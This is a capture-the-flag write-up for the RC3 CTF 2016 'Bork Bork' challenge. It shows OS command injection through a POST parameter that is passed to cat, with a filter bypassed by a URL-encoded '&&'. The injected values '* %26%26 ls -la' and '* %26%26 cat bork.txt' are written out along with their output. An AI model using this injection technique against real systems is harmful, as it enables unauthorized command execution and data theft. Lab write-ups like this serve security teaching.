---
layout: page
title: "RC3 CTF 2016 Writeup: Bork Bork"
---

> 300 points
> 
> We all love doggos and puppers. Have some more of one of our favorite puppers, Gabe. Bork.
> 
> https://ctf.rc3.club:3100/
> 
> author:orkulus

This challenge was offline for quite a long time, but eventually they fixed it well enough so that it could be analyzed.

The drop down list on the front page shows a list of video clips of a dog barking to various tunes. Closer examination showed that a ```bork``` parameter contains a name of a text file.

When we ssend a POST request with an empty ```bork``` parameter we get the following error in the response:

```
<iframe width="854" height="480" src="cat: borks/: Is a directory?autoplay=1&loop=1" frameborder="0"></iframe>
```

This means that they are essentially ```cat```'ting the file that is sent in as a parameter. Maybe we can use OS command injection here.

Specifying ```..```, ```/```, ```;```, ```$()``` and others as parameter value caused an error, there must be logic in the application that sanitizes the input. However URL-encoding ```&&``` worked, parameter value ```* %26%26 ls -la``` got us the following list:

```
-rw-r--r-- 1 root root   77 Nov 20 06:24 auto_bork.sh
-rw-r--r-- 2 root root  153 Nov 19 17:22 bork.ini
-rw-r--r-- 1 root root 1450 Nov 20 06:32 bork.py
-rw-r--r-- 2 root root 1347 Nov 19 17:22 bork.pyc
-rw-r----- 2 root root    0 Nov 19 17:22 bork.sock
-rw-r--r-- 2 root root   18 Nov 19 17:22 bork.txt
drwxr-xr-x 2 root root 4096 Nov 19 18:03 borks
drwxr-xr-x 2 root root 4096 Nov 19 18:03 static
drwxr-xr-x 2 root root 4096 Nov 19 18:03 templates
-rw-r--r-- 2 root root   86 Nov 19 17:22 wsgi.py
```

We examined all of these files and eventually got the flag ```RC3-2016-L057d0g3``` by specifying parameter value ```* %26%26 cat bork.txt```. 
